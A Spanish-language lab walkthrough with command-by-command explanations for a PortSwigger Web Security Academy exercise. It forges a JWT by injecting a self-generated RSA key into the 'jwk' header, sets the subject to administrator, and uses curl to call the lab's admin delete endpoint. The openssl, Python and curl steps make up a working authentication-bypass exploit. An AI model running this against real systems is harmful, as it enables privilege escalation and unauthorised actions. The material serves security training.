#readme

### 1. Generar tu par de llaves RSA

Necesitas tu propia "identidad" para firmar el token.

```bash
openssl genrsa -out private.pem 2048

```

### 2. Extraer el valor 'n' (Modulus)

El valor `n` es la parte más larga de tu llave pública. Necesitamos sacarlo en formato hexadecimal y luego convertirlo a Base64URL.

```bash
# Extraer el módulo en hexadecimal
openssl rsa -in private.pem -modulus -noout | cut -d= -f2 > n.hex

# Convertirlo a Base64URL con este comando de Python (una sola línea)
python3 -c "import base64; h=open('n.hex').read().strip(); print(base64.urlsafe_b64encode(bytes.fromhex(h)).decode().replace('=', ''))" > n.b64

```

### 3. Construir los archivos JSON (Header y Payload)

Aquí es donde fallamos antes. Vamos a usar variables para evitar errores de escritura manual. El exponente `e` para RSA casi siempre es `AQAB`.

```bash
# Leer el valor N que generamos
N_VALUE=$(cat n.b64)

# Crear el Header con el JWK embebido
echo -n "{\"alg\":\"RS256\",\"jwk\":{\"kty\":\"RSA\",\"e\":\"AQAB\",\"n\":\"$N_VALUE\"}}" > header.json

# Crear el Payload cambiando el usuario a administrator
echo -n '{"iss":"portswigger","sub":"administrator","exp":1768189112}' > payload.json

```

---

### 4. Firmar el Token

Ahora vamos a unir las piezas y firmar con tu `private.pem`.

```bash
# Función para codificar a Base64URL
encode_b64url() {
  base64 | tr -d '=' | tr '+/' '-_' | tr -d '\n'
}

# 1. Preparar la parte de datos
H_B64=$(cat header.json | encode_b64url)
P_B64=$(cat payload.json | encode_b64url)
DATA="$H_B64.$P_B64"

# 2. Crear la firma digital
SIG_B64=$(echo -n "$DATA" | openssl dgst -sha256 -sign private.pem | encode_b64url)

# 3. Ensamblar el token final
FINAL_TOKEN="$DATA.$SIG_B64"

echo "Tu nuevo token es:"
echo $FINAL_TOKEN

```

---

### 5. Ejecutar el ataque

Usa el token generado en el comando `curl`. Asegúrate de usar la URL de **tu** laboratorio actual (la que empieza por `0ad9...`).

```bash
curl -v --http1.1 -H "Cookie: session=$FINAL_TOKEN" "https://[TU-LAB-ID].web-security-academy.net/admin/delete?username=carlos"

```

### 📊 Tabla de verificación para tu Portfolio

| Componente | Estado | Acción Realizada |
| --- | --- | --- |
| **Identidad** | Creada | Generación de par de llaves RSA-2048 local. |
| **Inyección** | Lista | Inserción de llave pública en el header (`jwk`). |
| **Integridad** | Forjada | Firma del token con la llave privada generada. |
| **Protocolo** | Ajustado | Uso de HTTP/1.1 para evitar errores de negociación. |

**Realidad técnica:** Si el servidor te da un **401**, es que el JSON del Header tiene algún carácter que no le gusta (revisa comas o espacios). Si te da un **302** y Carlos desaparece, el bypass de confianza ha sido exitoso.


#Exolicacion de cada comando y cada flag

¡Excelente! El éxito de este ataque confirma que el servidor tiene una **falla de confianza en el origen de la llave**. Has pasado de usar una herramienta automatizada a realizar una "cirugía" criptográfica manual.

Aquí tienes la explicación técnica desmenuzada de cada comando, tal como lo necesitas para tu artículo técnico:

---

### Fase 1: Creación de la Identidad Atacante

Para que el servidor acepte un token, este debe estar firmado. Como no tenemos la llave del servidor, generamos una propia y obligamos al servidor a usarla.

* `openssl genrsa -out private.pem 2048`: Genera un par de llaves RSA. Aunque el archivo dice `.pem`, contiene tanto la **llave privada** (para firmar) como la **pública** (que enviaremos al servidor). El tamaño 2048 es el estándar de seguridad actual.

---

### Fase 2: Extracción del "Módulo" (n)

Un JWK (JSON Web Key) no es más que una representación en texto de una llave pública RSA. Se compone principalmente de `n` (el módulo) y `e` (el exponente).

* `openssl rsa -in private.pem -modulus -noout`: Extrae el número **n** de la llave. Es un número larguísimo en hexadecimal que define la seguridad de la llave.
* `cut -d= -f2`: Limpia la salida para quedarnos solo con el número, eliminando el texto `Modulus=`.
* **El script de Python (`base64.urlsafe_b64encode`)**: Los JWT no usan Base64 estándar. Usan **Base64URL**, que cambia los caracteres `+` y `/` por `-` y `_` para que no se rompan al enviarse en una URL o cabecera HTTP. Además, elimina los símbolos `=` (padding).

---

### Fase 3: Construcción de los Objetos JSON

* `echo -n`: El flag `-n` es **crítico**. Evita que se añada un salto de línea invisible al final del archivo. Si hay un salto de línea, la firma será distinta y el servidor dará error.
* **Header (`header.json`)**: Aquí es donde ocurre la **inyección**. Metemos nuestra llave pública completa dentro del parámetro `jwk`. Le estamos diciendo al servidor: *"Oye, verifica mi firma usando esta llave que te adjunto aquí mismo"*.
* **Payload (`payload.json`)**: Modificamos el `sub` (subject) a `administrator`. Es el objetivo del ataque (escalada de privilegios).

---

### Fase 4: La Firma Criptográfica

Esta es la parte donde "sellamos" el engaño.

1. **Ensamblaje**: Un JWT se firma uniendo el `Header_B64` y el `Payload_B64` con un punto (`.`).
2. `openssl dgst -sha256 -sign private.pem`:
* `dgst -sha256`: Crea un resumen (hash) de los datos.
* `-sign private.pem`: Encripta ese resumen usando tu llave privada. Esto genera la **Firma Digital**. Solo tu llave privada puede haber creado esa firma, y solo tu llave pública (que va en el header) puede verificarla.



---

### Fase 5: El Envío (Curl)

* `--http1.1`: Como vimos, HTTP/2 es más estricto con el tamaño de las cabeceras. Al usar una llave RSA de 2048 bits, la cookie es muy grande y HTTP/1.1 la gestiona de forma más estable en entornos de laboratorio.
* `-H "Cookie: session=$FINAL_TOKEN"`: Insertamos nuestro token forjado en la cabecera donde el servidor busca la sesión.

---
